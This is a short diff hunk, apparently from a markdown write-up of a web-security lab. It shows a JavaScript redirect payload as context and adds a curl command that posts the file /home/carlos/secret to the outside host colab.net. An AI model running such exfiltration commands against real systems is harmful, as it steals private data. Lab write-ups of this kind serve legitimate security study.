@@ -50,8 +50,10 @@ window['location']['href']="http://google.com"
 
 ```
 
+```
+curl http://colab.net -d @/home/carlos/secret
 
-
+```
 
 
 
